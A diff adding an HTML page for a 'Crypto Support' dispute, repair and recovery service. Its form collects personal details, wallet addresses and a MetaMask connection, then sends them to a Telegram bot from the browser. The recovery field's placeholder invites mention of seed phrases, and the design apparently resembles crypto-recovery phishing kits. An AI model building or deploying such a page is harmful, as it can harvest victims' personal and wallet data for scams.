@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Crypto Support — Dispute / Repair / Recovery</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg1:#0c0f14;
+    --bg2:#13151a;
+    --accent:#c9ab5a; /* soft brushed gold */
+    --accent-weak:#bfa25a;
+    --card: rgba(18,19,22,0.86);
+    --muted:#aeb3bb;
+    --text:#eff1f3;
+  }
+  html,body{height:100%; margin:0; font-family:"Poppins",sans-serif; background: #0b0c10;}
+  /* Background image (uses your uploaded image filename) */
+  body::before{
+    content:"";
+    position:fixed; inset:0;
+    background: url('b4e53f6b-3052-4013-a233-f24e4cc51cbe.png') center/cover no-repeat fixed;
+    filter: blur(10px) brightness(.54);
+    z-index:0;
+  }
+
+  .wrap{position:relative; z-index:1; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px;}
+
+  .card{
+    width:100%; max-width:640px;
+    background: var(--card);
+    border-radius:14px;
+    border:1px solid rgba(255,255,255,0.06);
+    box-shadow:0 10px 40px rgba(3,6,12,0.6);
+    padding:28px;
+    color:var(--text);
+    backdrop-filter: blur(6px);
+  }
+
+  .header{
+    display:flex; align-items:center; justify-content:space-between; gap:12px;
+    margin-bottom:18px;
+  }
+  .title{font-size:20px; color:var(--accent); font-weight:700; letter-spacing:.3px;}
+  .subtitle{color:var(--muted); font-size:13px;}
+
+  .steps{display:flex; gap:8px; justify-content:space-between; margin-bottom:22px;}
+  .step{flex:1; text-align:center; font-size:12px; color:var(--muted);}
+  .step .dot{width:34px;height:34px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;border:1px solid rgba(255,255,255,0.06); background:transparent; margin-bottom:6px;}
+  .step.active .dot{background:var(--accent); color:#0b0c10; box-shadow:0 6px 18px rgba(0,0,0,0.45);}
+  .step.done .dot{background:#3fd3a9; color:#042; border-color:transparent;}
+
+  form{display:none;}
+  form.active{display:block; animation:fadeIn .28s ease both;}
+  @keyframes fadeIn{ from{opacity:0; transform:translateY(8px);} to{opacity:1; transform:none;} }
+
+  label{display:block; margin-top:12px; color:var(--muted); font-size:13px;}
+  input,select,textarea{
+    width:100%;
+    padding:10px 12px;
+    margin-top:6px;
+    background: rgba(255,255,255,0.03);
+    color:var(--text);
+    border:1px solid rgba(255,255,255,0.04);
+    border-radius:8px;
+    font-size:14px;
+    box-sizing:border-box;
+  }
+  textarea{min-height:100px; resize:vertical;}
+
+  .row{display:flex; gap:10px; margin-top:6px;}
+  .row > *{flex:1;}
+
+  .btns{display:flex; gap:12px; justify-content:space-between; margin-top:18px;}
+  .btn{padding:10px 16px; border-radius:8px; border:none; cursor:pointer; font-weight:600;}
+  .btn.next{background:linear-gradient(90deg,var(--accent),var(--accent-weak)); color:#081012; box-shadow:0 6px 18px rgba(15,10,5,0.12);}
+  .btn.back{background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.04);}
+
+  .connect{margin-top:8px; display:flex; gap:8px; align-items:center;}
+  .connect button{flex:1; padding:10px; border-radius:8px; border:none; background:transparent; color:var(--accent); font-weight:700; cursor:pointer; box-shadow:inset 0 -2px 0 rgba(0,0,0,0.12);}
+  .small{font-size:13px; color:var(--muted); margin-top:8px;}
+
+  .review{background:rgba(255,255,255,0.02); padding:14px; border-radius:10px; margin-top:12px; color:var(--muted); font-size:13px;}
+
+  input[readonly]{opacity:0.9; background: rgba(255,255,255,0.02);}
+
+  .file-note{font-size:12px; color:var(--muted); margin-top:6px;}
+
+  @media(max-width:640px){
+    .card{padding:20px;}
+    .steps{flex-direction:column; gap:10px;}
+    .step{width:100%; text-align:left;}
+    .row{flex-direction:column;}
+  }
+</style>
+
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="region" aria-label="Support form">
+      <div class="header">
+        <div>
+          <div class="title">Crypto Support — Dispute · Repair · Recovery</div>
+          <div class="subtitle">Select your case and follow the steps — connect wallet and upload proof.</div>
+        </div>
+        <div style="text-align:right"><small class="small">Secure & Trusted</small></div>
+      </div>
+
+      <div class="steps" aria-hidden="true">
+        <div class="step active" id="stepIndicator1"><div class="dot">1</div><div>Case</div></div>
+        <div class="step" id="stepIndicator2"><div class="dot">2</div><div>Personal</div></div>
+        <div class="step" id="stepIndicator3"><div class="dot">3</div><div>Details</div></div>
+        <div class="step" id="stepIndicator4"><div class="dot">4</div><div>Verify</div></div>
+      </div>
+
+      <!-- STEP 1: choose case -->
+      <form id="form1" class="active">
+        <label for="caseType">Select Case Type</label>
+        <select id="caseType" required>
+          <option value="">Choose...</option>
+          <option value="dispute">Dispute — Lost Transaction</option>
+          <option value="repair">Wallet Repair</option>
+          <option value="recovery">Wallet Recovery</option>
+        </select>
+
+        <div class="btns">
+          <div></div>
+          <button type="button" id="next1" class="btn next">Next →</button>
+        </div>
+      </form>
+
+      <!-- STEP 2: personal -->
+      <form id="form2" aria-hidden="true">
+        <label>Full Name</label>
+        <input id="fullName" type="text" placeholder="Jane Doe" required>
+
+        <div class="row">
+          <div>
+            <label>Email</label>
+            <input id="email" type="email" placeholder="you@example.com" required>
+          </div>
+          <div>
+            <label>Phone (optional)</label>
+            <input id="phone" type="text" placeholder="+1 555 555 555">
+          </div>
+        </div>
+
+        <label>Coin / Token</label>
+        <input id="coinType" type="text" placeholder="e.g. Bitcoin (BTC)">
+
+        <label>Wallet Address (if known)</label>
+        <input id="walletInput" type="text" placeholder="0x..." >
+
+        <div class="btns">
+          <button type="button" id="back2" class="btn back">← Back</button>
+          <button type="button" id="next2" class="btn next">Next →</button>
+        </div>
+      </form>
+
+      <!-- STEP 3: case details (dynamic) -->
+      <form id="form3" aria-hidden="true">
+        <!-- Dispute -->
+        <div id="disputeFields" style="display:none;">
+          <label>Amount (USD)</label>
+          <input id="disputeAmount" type="number" placeholder="e.g. 125.00">
+
+          <label>Platform / Exchange Name</label>
+          <input id="disputePlatform" type="text" placeholder="e.g. Binance">
+
+          <label>Describe the dispute (include tx id, date)</label>
+          <textarea id="disputeDesc" placeholder="Explain what happened..."></textarea>
+        </div>
+
+        <!-- Repair -->
+        <div id="repairFields" style="display:none;">
+          <label>Wallet Software / Type</label>
+          <input id="repairWallet" type="text" placeholder="e.g. MetaMask / Ledger / Trust Wallet">
+
+          <label>Describe the issue</label>
+          <textarea id="repairDesc" placeholder="What is not working? error messages..."></textarea>
+        </div>
+
+        <!-- Recovery -->
+        <div id="recoveryFields" style="display:none;">
+          <label>Platform / Service (if any)</label>
+          <input id="recoveryPlatform" type="text" placeholder="e.g. Coinbase login">
+
+          <label>Describe how wallet/access was lost</label>
+          <textarea id="recoveryDesc" placeholder="Lost keys, seed phrase, device stolen..."></textarea>
+        </div>
+
+        <div class="btns">
+          <button type="button" id="back3" class="btn back">← Back</button>
+          <button type="button" id="next3" class="btn next">Next →</button>
+        </div>
+      </form>
+
+      <!-- STEP 4: verification + send -->
+      <form id="form4" aria-hidden="true">
+        <label>Connect Wallet</label>
+        <div class="connect">
+          <button type="button" id="connectWalletBtn">Connect MetaMask</button>
+        </div>
+        <input id="connectedWallet" type="text" readonly placeholder="Not connected" required>
+
+        <label>Attach Proof (screenshot / tx receipt)</label>
+        <input id="proofFile" type="file" accept=".jpg,.png,.pdf">
+
+        <div class="file-note">Note: file upload will only record file name in the Telegram message. To store/transfer files, use a secure backend (recommended).</div>
+
+        <div class="review" id="reviewBox" aria-hidden="true">
+          <strong>Summary will appear here before sending.</strong>
+        </div>
+
+        <label style="margin-top:10px;"><input id="agree" type="checkbox" /> I confirm the information is correct</label>
+
+        <div class="btns">
+          <button type="button" id="back4" class="btn back">← Back</button>
+          <button type="submit" id="submitBtn" class="btn next">Submit Case</button>
+        </div>
+      </form>
+
+    </div>
+  </div>
+  
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  if (!requireAuth()) return;
+});
+
+// universal auth guard
+function requireAuth() {
+  const user = JSON.parse(localStorage.getItem('cdpUser') || 'null');
+  if (!user) {
+    localStorage.setItem('cdp_return_url', window.location.href);
+    window.location.href = 'signin.html';
+    return false;
+  }
+  return true;
+}
+
+/* ---------- Navigation ---------- */
+const totalSteps = 4;
+let current = 1;
+const indicators = [1,2,3,4].map(i => document.getElementById('stepIndicator'+i));
+function show(step) {
+  current = step;
+  for(let i=1;i<=totalSteps;i++){
+    const form = document.getElementById('form'+i);
+    const ind = document.getElementById('stepIndicator'+i);
+    if(i===step){ form.classList.add('active'); form.removeAttribute('aria-hidden'); ind.classList.add('active'); ind.classList.remove('done'); }
+    else { form.classList.remove('active'); form.setAttribute('aria-hidden','true'); ind.classList.remove('active'); if(i<step) ind.classList.add('done'); else ind.classList.remove('done'); }
+  }
+}
+show(1);
+
+document.getElementById('next1').addEventListener('click', ()=>{
+  const v = document.getElementById('caseType').value;
+  if(!v) return alert('Please select a case type.');
+  // show/hide fields in step 3
+  caseType = v;
+  renderCaseFields();
+  show(2);
+});
+
+document.getElementById('back2').addEventListener('click', ()=>show(1));
+document.getElementById('next2').addEventListener('click', ()=>show(3));
+document.getElementById('back3').addEventListener('click', ()=>show(2));
+document.getElementById('next3').addEventListener('click', ()=>{
+  populateReview();
+  show(4);
+});
+document.getElementById('back4').addEventListener('click', ()=>show(3));
+
+/* ---------- Case-specific field handling ---------- */
+let caseType = '';
+function renderCaseFields(){
+  document.getElementById('disputeFields').style.display = caseType==='dispute' ? 'block' : 'none';
+  document.getElementById('repairFields').style.display = caseType==='repair' ? 'block' : 'none';
+  document.getElementById('recoveryFields').style.display = caseType==='recovery' ? 'block' : 'none';
+}
+
+/* ---------- MetaMask connect ---------- */
+const connectBtn = document.getElementById('connectWalletBtn');
+connectBtn.addEventListener('click', connectWallet);
+async function connectWallet(){
+  if(typeof window.ethereum === 'undefined'){
+    alert('MetaMask not detected. Please install MetaMask extension.');
+    return;
+  }
+  try{
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    const addr = accounts[0];
+    document.getElementById('connectedWallet').value = addr;
+    // if wallet field in step2 is empty, populate
+    const w = document.getElementById('walletInput');
+    if(w && (!w.value || w.value.trim()==='')) w.value = addr;
+  }catch(err){
+    console.error(err);
+    alert('Could not connect wallet: ' + (err.message || err));
+  }
+}
+
+/* ---------- Build preview / review ---------- */
+function populateReview(){
+  const name = document.getElementById('fullName').value || '(not provided)';
+  const email = document.getElementById('email').value || '(not provided)';
+  const phone = document.getElementById('phone').value || '(not provided)';
+  const coin = document.getElementById('coinType').value || '(not provided)';
+  const wallet = document.getElementById('connectedWallet').value || document.getElementById('walletInput').value || '(not provided)';
+  let details = '';
+
+  if(caseType==='dispute'){
+    details += `<strong>Case:</strong> Dispute Lost Transaction\n`;
+    const amt = document.getElementById('disputeAmount').value || '(n/a)';
+    const plat = document.getElementById('disputePlatform').value || '(n/a)';
+    const d = document.getElementById('disputeDesc').value || '(n/a)';
+    details += `<strong>Amount:</strong> ${amt}\n<strong>Platform:</strong> ${plat}\n<strong>Details:</strong> ${d}\n`;
+  } else if(caseType==='repair'){
+    details += `<strong>Case:</strong> Wallet Repair\n`;
+    const wname = document.getElementById('repairWallet').value || '(n/a)';
+    const d = document.getElementById('repairDesc').value || '(n/a)';
+    details += `<strong>Wallet:</strong> ${wname}\n<strong>Details:</strong> ${d}\n`;
+  } else if(caseType==='recovery'){
+    details += `<strong>Case:</strong> Wallet Recovery\n`;
+    const plat = document.getElementById('recoveryPlatform').value || '(n/a)';
+    const d = document.getElementById('recoveryDesc').value || '(n/a)';
+    details += `<strong>Platform:</strong> ${plat}\n<strong>Details:</strong> ${d}\n`;
+  }
+
+  const proof = document.getElementById('proofFile').files[0];
+  const proofName = proof ? proof.name : '(no file attached)';
+  const summary = 
+    `Name: ${name}\nEmail: ${email}\nPhone: ${phone}\nCoin: ${coin}\nWallet: ${wallet}\n\n${details}\nProof file: ${proofName}`;
+
+  document.getElementById('reviewBox').innerText = summary;
+  document.getElementById('reviewBox').removeAttribute('aria-hidden');
+}
+
+/* ---------- Send to Telegram (client-side) ---------- */
+/*
+  SECURITY NOTE:
+  - Placing BOT_TOKEN in client code exposes it publicly.
+  - For production, use a server endpoint (Netlify Function / small server) to hide your token.
+  - If you choose to use client-side, paste your token/chat id in the two constants below.
+*/
+
+async function sendToTelegram(payloadText){
+  // ********** REPLACE THESE VALUES LOCALLY (or call your server endpoint) **********
+  const BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE'; // <-- replace locally if you accept the risk
+  const CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';     // <-- replace locally if you accept the risk
+  // *******************************************************************************
+
+  if(!BOT_TOKEN || !CHAT_ID){
+    alert('Telegram token/chat id not set. Open code and paste your BOT_TOKEN and CHAT_ID in sendToTelegram().');
+    return { ok:false, msg:'missing_token' };
+  }
+
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const body = {
+    chat_id: CHAT_ID,
+    text: payloadText,
+    parse_mode: 'Markdown'
+  };
+
+  try{
+    const resp = await fetch(url, {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(body)
+    });
+    const data = await resp.json();
+    if(!data.ok) throw new Error(data.description || 'telegram error');
+    return { ok:true, data };
+  }catch(err){
+    console.error('Telegram send error', err);
+    return { ok:false, err };
+  }
+}
+
+/* ---------- Final submit handler ---------- */
+document.getElementById('form4').addEventListener('submit', async (ev)=>{
+  ev.preventDefault();
+  if(!document.getElementById('agree').checked){
+    return alert('Please confirm the information before submitting.');
+  }
+
+  populateReview(); // ensure review updated
+  const name = document.getElementById('fullName').value || '(not provided)';
+  const email = document.getElementById('email').value || '(not provided)';
+  const phone = document.getElementById('phone').value || '(not provided)';
+  const coin = document.getElementById('coinType').value || '(not provided)';
+  const wallet = document.getElementById('connectedWallet').value || document.getElementById('walletInput').value || '(not provided)';
+  const proof = document.getElementById('proofFile').files[0];
+  const proofName = proof ? proof.name : '(none)';
+
+  let caseDetails = '';
+  if(caseType==='dispute'){
+    caseDetails = `*Case:* Dispute Lost Transaction\n*Amount:* ${document.getElementById('disputeAmount').value || '(n/a)'}\n*Platform:* ${document.getElementById('disputePlatform').value || '(n/a)'}\n*Details:* ${document.getElementById('disputeDesc').value || '(n/a)'}`;
+  }else if(caseType==='repair'){
+    caseDetails = `*Case:* Wallet Repair\n*Wallet:* ${document.getElementById('repairWallet').value || '(n/a)'}\n*Details:* ${document.getElementById('repairDesc').value || '(n/a)'}`;
+  }else if(caseType==='recovery'){
+    caseDetails = `*Case:* Wallet Recovery\n*Platform:* ${document.getElementById('recoveryPlatform').value || '(n/a)'}\n*Details:* ${document.getElementById('recoveryDesc').value || '(n/a)'}`;
+  }
+
+  const message = 
+`🛡️ *New Support Case*\n
+*Type:* ${caseType}\n*Name:* ${escapeMarkdown(name)}\n*Email:* ${escapeMarkdown(email)}\n*Phone:* ${escapeMarkdown(phone)}\n*Coin:* ${escapeMarkdown(coin)}\n*Wallet:* ${escapeMarkdown(wallet)}\n\n${caseDetails}\n\n*Proof file:* ${escapeMarkdown(proofName)}\n\n_Submitted from website_`;
+
+  // Send message
+  const res = await sendToTelegram(message);
+  if(res.ok){
+    alert('✅ Case submitted — we will contact you via email. Thank you.');
+    // Optionally clear form or go to start
+    resetAll();
+    show(1);
+  }else{
+    alert('⚠️ Failed to send case to Telegram. See console for details. Consider using a server-side function.');
+  }
+});
+
+/* ---------- small utilities ---------- */
+function resetAll(){
+  document.querySelectorAll('input[type=text], input[type=email], input[type=number], textarea').forEach(i=>i.value='');
+  document.querySelectorAll('input[type=file]').forEach(f=>f.value='');
+  document.getElementById('agree').checked = false;
+  document.getElementById('connectedWallet').value = '';
+  document.getElementById('caseType').value = '';
+}
+function escapeMarkdown(s){
+  if(!s) return '';
+  // very small sanitizer for Telegram Markdown special chars
+  return String(s).replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
+}
+</script>
+<script src="dark-lock.js"></script>
+</body>
+</html>
